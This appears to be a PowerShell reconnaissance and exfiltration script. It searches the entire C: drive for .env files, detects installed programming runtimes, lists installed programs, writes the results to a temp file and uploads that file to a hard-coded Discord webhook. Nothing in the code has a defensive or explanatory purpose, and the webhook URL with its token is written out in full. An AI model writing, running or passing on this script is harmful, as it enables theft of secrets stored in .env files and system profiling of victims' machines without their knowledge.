# ====== Configuration ======
$webhook = "https://discord.com/api/webhooks/1383272541421961258/GbQzutkDEk-ZePgXlpfrllxMK-f6JJ48Kz9WUEK21nF41qGPFbB6pzJ8gQQ9iEzSXE2V"
$hostname = $env:COMPUTERNAME
$user = $env:USERNAME
$tempFile = "$env:TEMP\recon_$($hostname).txt"

# ====== Function: Search .env files ======
$envFiles = Get-ChildItem -Path C:\ -Filter ".env" -Recurse -ErrorAction SilentlyContinue -Force |
    Select-Object -ExpandProperty FullName

# ====== Function: Detect programming languages ======
$languages = @()

if (Get-Command python -ErrorAction SilentlyContinue) { $languages += "Python" }
if (Get-Command node -ErrorAction SilentlyContinue) { $languages += "Node.js" }
if (Get-Command php -ErrorAction SilentlyContinue) { $languages += "PHP" }
if (Get-Command ruby -ErrorAction SilentlyContinue) { $languages += "Ruby" }
if (Get-Command javac -ErrorAction SilentlyContinue) { $languages += "Java (JDK)" }
if (Test-Path "C:\Program Files (x86)\Microsoft Visual Studio") { $languages += "Visual Studio / C#" }

# ====== Function: List installed programs ======
$apps = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion |
    Where-Object { $_.DisplayName } |
    ForEach-Object { "$($_.DisplayName) ($($_.DisplayVersion))" }

# ====== Output to file ======
@"
Recon report for $hostname by $user

--- .env Files ---
$($envFiles -join "`n")

--- Languages Detected ---
$($languages -join ", ")

--- Installed Programs ---
$($apps -join "`n")

"@ | Out-File -Encoding ASCII -FilePath $tempFile

# ====== Upload to Discord ======
$Body = @{
  "content" = "**[$hostname] Recon Report from $user**"
}

Invoke-RestMethod -Uri $webhook -Method Post -Body $Body

Start-Sleep -Seconds 1

Invoke-RestMethod -Uri $webhook -Method Post -Form @{
  "file" = Get-Item $tempFile
}
